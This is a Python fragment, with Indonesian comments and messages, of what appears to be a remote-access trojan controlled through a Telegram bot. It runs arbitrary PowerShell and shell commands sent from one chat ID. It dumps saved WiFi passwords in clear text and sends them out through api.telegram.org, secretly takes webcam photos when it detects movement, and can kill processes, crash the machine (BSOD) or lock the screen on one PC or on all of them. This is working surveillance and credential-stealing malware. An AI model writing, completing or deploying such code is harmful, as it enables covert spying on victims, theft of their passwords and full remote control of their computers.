    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "👋 **SISTEM OFFLINE**"})
    except: pass

atexit.register(pesan_perpisahan)

def cmd_process():
    processes = [f"🔹 {proc.info['name']} ({proc.info['cpu_percent']}%)" for proc in sorted(psutil.process_iter(['name', 'cpu_percent']), key=lambda p: p.info['cpu_percent'], reverse=True)[:10]]
    kirim_pesan(f"🖥️ **Top 10 Processes:**\n" + "\n".join(processes))

def cmd_wifi():
    try:
        profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp437', errors="replace")
        profiles = [line.split(":")[1].strip() for line in profiles_data.split('\n') if "All User Profile" in line]
        pass_res = ""
        for i in profiles:
            try:
                detail = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp437', errors="replace")
                pw = [line.split(":")[1].strip() for line in detail.split('\n') if "Key Content" in line]
                pass_res += f"📶 `{i}` : `{pw[0] if pw else '[Tanpa Password]'}`\n"
            except: pass_res += f"📶 `{i}` : `[Error]`\n"
        kirim_pesan(f"🔑 **WiFi Password:**\n{pass_res if pass_res else '❌ Kosong.'}")
    except Exception as e: kirim_pesan(f"❌ Gagal WiFi: {e}")

def cmd_ps(command):
    try:
        output = subprocess.check_output(f'powershell -ExecutionPolicy Bypass -Command "{command}"', shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        kirim_pesan(f"🟦 **PS Output:**\n`{output.decode('cp437', errors='replace')[:4000]}`")
    except Exception as e: kirim_pesan(f"❌ **PS Error:** `{e}`")

def cmd_web(url):
    if not url.startswith("http"): url = "https://" + url
    webbrowser.open(url); kirim_pesan(f"🌐 **Web Dibuka:** {url}")

def cmd_taskkill(nama):
    os.system(f"taskkill /F /IM {nama}"); kirim_pesan(f"💀 **Dimatikan:** `{nama}`")

def cmd_restart():
    kirim_pesan("🔄 **Restarting...**"); os.startfile(os.path.realpath(sys.argv[0])); time.sleep(2); os._exit(0)

def set_bot_commands():
    try:
        cmds_list = [{"command": "start", "description": "Menu Utama"}, {"command": "list", "description": "Daftar PC Online"}] # simplified for example
        requests.post(f"https://api.telegram.org/bot{TOKEN}/setMyCommands", json={"commands": cmds_list})
    except: pass

def handle_commands():
    global is_targeted; set_bot_commands(); last_update_id = 0
    try:
        res_flush = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset=-1", timeout=5).json()
        if res_flush.get("result"): last_update_id = res_flush["result"][0]["update_id"]
    except: pass
    cmds = {"/start": cmd_start, "/list": cmd_list, "/screenshot": cmd_screenshot, "/log": cmd_log, "/dekam": cmd_dekam, "/alarm": cmd_alarm, "/lock": cmd_lock, "/spec": cmd_spec, "/fullspec": cmd_fullspec, "/wifi": cmd_wifi, "/botoff": cmd_botoff, "/restart": cmd_restart, "/bsod": cmd_bsod, "/monitoff": cmd_monitoff, "/process": cmd_process, "/startup": cmd_startup}
    while True:
        try:
            res = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=20").json()
            for update in res.get("result", []):
                last_update_id = update["update_id"]
                if "message" in update:
                    msg = update["message"]; user_id = str(msg.get("from", {}).get("id", ""))
                    if user_id != CHAT_ID: continue
                    text = msg.get("text", msg.get("caption", "")).strip()
                    if not text: continue
                    if text == "/list":
                        if IS_ACTIVATED: kirim_pesan_markup(f"🖥️ Online: `[{MY_HOSTNAME}]`", {"inline_keyboard": [[{"text": f"🎮 Kontrol: {MY_HOSTNAME}", "callback_data": f"SELECT|{MY_HOSTNAME}"}]]})
                        continue
                    target_id = None; cmd_text = text
                    if "|" in text: p = text.split("|", 1); target_id = p[0].strip().upper(); cmd_text = p[1].strip()
                    elif text.startswith("/all "): target_id = "ALL"; cmd_text = text.replace("/all ", "").strip()
                    should_exec = False
                    if not IS_ACTIVATED:
                        if cmd_text.startswith("/rename ") and (target_id == MY_HOSTNAME or target_id is None): cmd_rename(cmd_text.replace("/rename ", "").strip())
                        continue
                    if target_id == "ALL" or target_id == MY_HOSTNAME or (target_id is None and is_targeted): should_exec = True
                    if not should_exec: continue
                    if cmd_text.startswith("/say "): cmd_say(cmd_text.replace("/say ", ""))
                    elif cmd_text.startswith("/popup "): cmd_popup(cmd_text.replace("/popup ", ""))
                    elif cmd_text.startswith("/cmd "): cmd_shell(cmd_text.replace("/cmd ", ""))
                    elif cmd_text in cmds: cmds[cmd_text]()
                elif "callback_query" in update:
                    cb = update["callback_query"]; data = cb["data"]; user_id = str(cb.get("from", {}).get("id", ""))
                    if user_id != CHAT_ID: continue
                    if data.startswith("RENAME_REQ|") and data.split("|")[1] == MY_HOSTNAME: kirim_pesan(f"📝 Format: `{MY_HOSTNAME}|/rename NAMA`")
                    elif data.startswith("SELECT|"):
                        if data.split("|")[1] == MY_HOSTNAME: is_targeted = True; cmd_start(targeted=True)
                        else: is_targeted = False
                    elif is_targeted and data in cmds: cmds[data]()
        except: time.sleep(5)
        time.sleep(1)

def kirim_pesan_markup(teks, markup):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": teks, "parse_mode": "Markdown", "reply_markup": json.dumps(markup)})
    except: pass
threading.Thread(target=handle_commands, daemon=True).start()
cmd_online_alert()
cam = None; prev_frame = None
try:
    while True:
        if fitur_kamera:
            if cam is None or not cam.isOpened(): cam = cv2.VideoCapture(0); time.sleep(2)
            ret, frame = cam.read()
            if not ret: continue
            gray = cv2.GaussianBlur(cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY), (21, 21), 0)
            if prev_frame is None: prev_frame = gray; continue
            if cv2.absdiff(prev_frame, gray).sum() > 1000000:
                p = os.path.join(folder_name, f"Gerak_{datetime.now().strftime('%H-%M-%S')}.jpg")
                cv2.imwrite(p, frame); kirim_foto(p, "⚠️ Gerakan!")
            prev_frame = gray
        else:
            if cam: cam.release(); cam = None
            prev_frame = None
        time.sleep(1)
except: pass
finally:
    if cam: cam.release()
